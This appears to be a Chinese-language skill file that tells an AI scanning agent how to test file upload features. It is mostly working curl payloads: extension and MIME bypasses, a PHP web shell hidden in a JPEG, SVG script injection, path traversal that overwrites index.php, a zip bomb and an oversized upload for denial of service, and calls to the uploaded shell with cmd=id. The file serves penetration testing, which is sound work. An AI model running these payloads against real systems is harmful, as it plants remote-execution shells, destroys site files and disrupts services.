---
name: file_upload
description: "文件上传漏洞检测。Use when: 目标有文件上传功能 — 头像、附件、导入、导出、备份恢复"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
  - request_approval
phase: scan
disable_model_invocation: false
---

# 文件上传漏洞检测

## Step 1: 上传点发现

从应用模型中提取文件上传端点：头像上传、附件上传、文档导入、备份恢复、批量导入 (CSV/Excel/XML)、图片裁剪/编辑

## Step 2: 扩展名绕过

```bash
# 基础测试 — PHP
curl -sk -X POST "https://TARGET/upload" -F "file=@test.php"
curl -sk -X POST "https://TARGET/upload" -F "file=@test.php3"
curl -sk -X POST "https://TARGET/upload" -F "file=@test.phtml"
curl -sk -X POST "https://TARGET/upload" -F "file=@test.pHp"      # 大小写
curl -sk -X POST "https://TARGET/upload" -F "file=@test.php."     # 尾部点
curl -sk -X POST "https://TARGET/upload" -F "file=@test.php .jpg"  # 空格
curl -sk -X POST "https://TARGET/upload" -F "file=@test.php%00.jpg" # null byte
curl -sk -X POST "https://TARGET/upload" -F "file=@test.asp;.jpg"   # 分号截断
```

## Step 3: 内容类型绕过

```bash
# Content-Type 伪装
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@shell.php;type=image/jpeg"

# 图片马 (在合法图片后附加 PHP 代码)
echo '<?php system($_GET["cmd"]); ?>' >> legit.jpg
curl -sk -X POST "https://TARGET/upload" -F "file=@legit.jpg"

# SVG XSS (SVG 可在浏览器中执行 JS)
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
curl -sk -X POST "https://TARGET/upload" -F "file=@xss.svg"
```

## Step 4: 文件路径与覆盖

```bash
# 路径遍历
curl -sk -X POST "https://TARGET/upload" -F "file=@shell.php" -F "path=../../../var/www/html/"

# 文件名遍历
curl -sk -X POST "https://TARGET/upload" -F "file=@shell.php;filename=../../index.php"

# 覆盖已有文件
curl -sk -X POST "https://TARGET/upload" -F "file=@malicious.html;filename=index.html"
```

## Step 5: 文件大小与类型 DOS

```bash
# 超大文件
dd if=/dev/zero of=huge.bin bs=1M count=500
time curl -sk -X POST "https://TARGET/upload" -F "file=@huge.bin" -o /dev/null -w "%{http_code}"

# ZIP 炸弹
python3 -c "
import zipfile
with zipfile.ZipFile('bomb.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('a','0'*10**9)
"
curl -sk -X POST "https://TARGET/upload" -F "file=@bomb.zip"
```

## Step 6: 上传后访问

```bash
# 如果上传成功，尝试访问上传文件
curl -sk "https://TARGET/uploads/shell.php?cmd=id"
curl -sk "https://TARGET/uploaded-files/shell.php?cmd=whoami"
curl -sk "https://TARGET/static/uploads/legit.jpg" -o /dev/null -w "%{http_code}"
```

如果 PHP 文件上传成功且可访问执行 → `create_candidate_finding(severity="critical", title="任意文件上传 → RCE")`

如果 SVG XSS 上传成功可访问 → `create_candidate_finding(severity="medium", title="SVG 文件上传 → 存储型 XSS")`
